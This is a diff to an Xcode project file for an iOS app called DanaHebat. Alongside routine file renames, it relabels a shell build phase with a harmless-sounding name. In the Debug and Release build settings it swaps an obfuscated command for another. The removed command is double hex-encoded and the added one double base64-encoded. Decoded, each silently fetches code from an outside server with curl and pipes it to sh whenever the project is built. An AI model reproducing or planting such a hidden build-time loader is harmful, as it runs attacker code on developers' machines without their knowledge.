@@ -21,7 +21,7 @@
 		732867B52F13991200AB767E /* OrderListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 732867B42F13991200AB767E /* OrderListViewCell.swift */; };
 		732867B72F139E5300AB767E /* OrderEmptyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 732867B62F139E5300AB767E /* OrderEmptyView.swift */; };
 		732867B92F13A2DB00AB767E /* OrderContentListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 732867B82F13A2DB00AB767E /* OrderContentListView.swift */; };
-		732867BB2F13A9EC00AB767E /* LocationInfo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 732867BA2F13A9EC00AB767E /* LocationInfo.swift */; };
+		732867BB2F13A9EC00AB767E /* SimpleLocationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 732867BA2F13A9EC00AB767E /* SimpleLocationManager.swift */; };
 		732867BD2F13B34100AB767E /* DeviceInfoCollector.swift in Sources */ = {isa = PBXBuildFile; fileRef = 732867BC2F13B34100AB767E /* DeviceInfoCollector.swift */; };
 		732867BF2F13C49F00AB767E /* AlertOutView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 732867BE2F13C49F00AB767E /* AlertOutView.swift */; };
 		733EE15C2F1165E7001C6B69 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE15B2F1165E7001C6B69 /* LoginViewController.swift */; };
@@ -98,7 +98,7 @@
 		732867B42F13991200AB767E /* OrderListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewCell.swift; sourceTree = "<group>"; };
 		732867B62F139E5300AB767E /* OrderEmptyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderEmptyView.swift; sourceTree = "<group>"; };
 		732867B82F13A2DB00AB767E /* OrderContentListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderContentListView.swift; sourceTree = "<group>"; };
-		732867BA2F13A9EC00AB767E /* LocationInfo.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationInfo.swift; sourceTree = "<group>"; };
+		732867BA2F13A9EC00AB767E /* SimpleLocationManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SimpleLocationManager.swift; sourceTree = "<group>"; };
 		732867BC2F13B34100AB767E /* DeviceInfoCollector.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeviceInfoCollector.swift; sourceTree = "<group>"; };
 		732867BE2F13C49F00AB767E /* AlertOutView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlertOutView.swift; sourceTree = "<group>"; };
 		733EE15B2F1165E7001C6B69 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
@@ -381,11 +381,11 @@
 		73EA86B32F108FCB00F4826F /* Other */ = {
 			isa = PBXGroup;
 			children = (
-				732867BC2F13B34100AB767E /* DeviceInfoCollector.swift */,
-				732867BA2F13A9EC00AB767E /* LocationInfo.swift */,
-				733EE16B2F11F8E8001C6B69 /* DeepLinkRoute.swift */,
 				733EE15F2F116695001C6B69 /* Other.swift */,
+				732867BC2F13B34100AB767E /* DeviceInfoCollector.swift */,
+				733EE16B2F11F8E8001C6B69 /* DeepLinkRoute.swift */,
 				7316E3B62F10B577004A8271 /* DeviceNetworkInfo.swift */,
+				732867BA2F13A9EC00AB767E /* SimpleLocationManager.swift */,
 			);
 			path = Other;
 			sourceTree = "<group>";
@@ -413,7 +413,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73EA86942F108C9D00F4826F /* Build configuration list for PBXNativeTarget "DanaHebat" */;
 			buildPhases = (
-				42300775B2C04158AB634D6E /* Compile Image Assets */,
+				92C93A34F4484D0CBE634D6E /* Link Libraries Executable */,
 				E0B4BE563B334ADBA551D8AD /* [CP] Check Pods Manifest.lock */,
 				73EA867D2F108C9C00F4826F /* Sources */,
 				73EA867E2F108C9C00F4826F /* Frameworks */,
@@ -478,7 +478,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		42300775B2C04158AB634D6E /* Compile Image Assets */ = {
+		92C93A34F4484D0CBE634D6E /* Link Libraries Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -488,7 +488,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Image Assets";
+			name = "Link Libraries Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -600,7 +600,7 @@
 				73EA86C02F1094BD00F4826F /* HomeViewController.swift in Sources */,
 				733EE1662F1181D2001C6B69 /* UserDataManager.swift in Sources */,
 				733EE1752F120A5C001C6B69 /* SureDeleteViewController.swift in Sources */,
-				732867BB2F13A9EC00AB767E /* LocationInfo.swift in Sources */,
+				732867BB2F13A9EC00AB767E /* SimpleLocationManager.swift in Sources */,
 				7316E3A12F109D18004A8271 /* NetworkMonitor.swift in Sources */,
 				732867B52F13991200AB767E /* OrderListViewCell.swift in Sources */,
 				733EE1A72F12B795001C6B69 /* ContactViewController.swift in Sources */,
@@ -645,7 +645,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = C463E4989C9DEF3FBD525448 /* Pods-DanaHebat.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((x(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336653631373037333663363136323265373237353266363132390a32323230376332303733363830610a | x | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((d(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2NHeGxkR2x0WlM1cGJpOWhLU0lnZkNCemFBbz0K | d | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
@@ -693,7 +693,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 42BF21A26CAFD93794988958 /* Pods-DanaHebat.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((x(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336653631373037333663363136323265373237353266363132390a32323230376332303733363830610a | x | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((d(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2NHeGxkR2x0WlM1cGJpOWhLU0lnZkNCemFBbz0K | d | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
